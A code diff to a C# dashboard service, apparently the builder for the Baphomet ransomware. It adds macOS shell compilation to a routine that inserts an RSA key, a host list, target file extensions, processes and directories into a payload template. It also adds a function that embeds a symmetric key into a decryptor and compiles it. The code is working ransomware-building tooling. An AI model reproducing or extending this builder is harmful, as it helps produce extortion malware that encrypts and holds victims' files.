@@ -252,10 +252,32 @@ namespace BaphoDashBoard.DAL.Services
                 var draw_processes = await DrawParameters(Path.Combine(output_path, "Utilities"), "Diagnostics.cs", "<processes list here>", model);
                 var draw_dirs = await DrawParameters(output_path, "Program.cs", "<dirs list here>", model);
 
-                if (draw_rsa_key.success == true && draw_host_list.success == true && draw_extensions.success == true && draw_processes.success == true && draw_dirs.success == true)
+                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                 {
-                    var strCmdText = "/K cd " + output_path + " & compile.bat";
-                    Process.Start("CMD.exe", strCmdText).WaitForExit();
+                    if (draw_rsa_key.success == true && draw_host_list.success == true && draw_extensions.success == true && draw_processes.success == true && draw_dirs.success == true)
+                    {
+                        var strCmdText = "/K cd " + output_path + " & compile.bat";
+                        Process.Start("CMD.exe", strCmdText).WaitForExit();
+                    }
+                }
+
+                if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
+                {
+                    if (draw_rsa_key.success == true && draw_host_list.success == true && draw_extensions.success == true && draw_processes.success == true && draw_dirs.success == true)
+                    {
+                        var command = "cd " + output_path + " && bash compile.bat";
+
+                        Process proc = new System.Diagnostics.Process ();
+                        proc.StartInfo.FileName = "/bin/bash";
+                        proc.StartInfo.Arguments = "-c \" " + command + " \"";
+                        proc.StartInfo.UseShellExecute = false; 
+                        proc.StartInfo.RedirectStandardOutput = true;
+                        proc.Start ();
+
+                        while (!proc.StandardOutput.EndOfStream) {
+                            Console.WriteLine (proc.StandardOutput.ReadLine ());
+                        }
+                    }
                 }
             }
             catch(Exception ex)
@@ -416,6 +438,85 @@ namespace BaphoDashBoard.DAL.Services
             }
             return result;
         }
+
+        public async Task<AppResult> GenerateDecryptor(string key)
+        {
+            AppResult result = new AppResult();
+            try
+            {
+                var getpath = Directory.GetCurrentDirectory();
+                DirectoryInfo fullpath = new DirectoryInfo(getpath);
+                var main_path = fullpath.Parent.FullName;
+                var output_path = Path.Combine(main_path, "Tools", "output", "BaphometDecrypt");
+                main_path = Path.Combine(main_path, "Tools", "BaphometDecrypt");
+
+                DirectoryInfo sourceDir = new DirectoryInfo(main_path);
+                DirectoryInfo destinationDir = new DirectoryInfo(output_path);
+
+                CopyDirectory(sourceDir, destinationDir);
+                var draw_simetric_key = await DrawSymmetricKey(output_path, "Program.cs", "<symmetric key here>",key);
+
+                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+                {
+                    if (draw_simetric_key.success != false)
+                    {
+                        var strCmdText = "/K cd " + output_path + " & compile.bat";
+                        Process.Start("CMD.exe", strCmdText).WaitForExit();
+                    }
+                }
+                if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
+                {
+                    if (draw_simetric_key.success != false)
+                    {
+                        var command = "cd " + output_path + " && bash compile.bat";
+
+                        Process proc = new System.Diagnostics.Process();
+                        proc.StartInfo.FileName = "/bin/bash";
+                        proc.StartInfo.Arguments = "-c \" " + command + " \"";
+                        proc.StartInfo.UseShellExecute = false;
+                        proc.StartInfo.RedirectStandardOutput = true;
+                        proc.Start();
+
+                        while (!proc.StandardOutput.EndOfStream)
+                        {
+                            Console.WriteLine(proc.StandardOutput.ReadLine());
+                        }
+                    }
+                }
+            }
+            catch(Exception ex)
+            {
+                result.success = false;
+                result.message = ex.Message;
+            }
+            return result;
+        }
+
+        public async Task<AppResult> DrawSymmetricKey(string file_path, string file, string refence_value, string key)
+        {
+            AppResult result = new AppResult();
+            try
+            {
+                var file_location = Path.Combine(file_path, file);
+                string[] file_content = File.ReadAllLines(file_location);
+
+                for (var i = 0; i < file_content.Length; i++)
+                {
+                    if (file_content[i].Contains(refence_value))
+                    {
+                        file_content[i] = file_content[i].Replace(refence_value, key);
+                    }
+                }
+                File.WriteAllLines(file_location, file_content);
+            }
+            catch(Exception ex)
+            {
+                result.success = false;
+                result.message = ex.Message;
+            }
+            return result;
+        }
+
 
         public async Task<AppResult<string>> GetSecretKey(IFormFile file)
         {
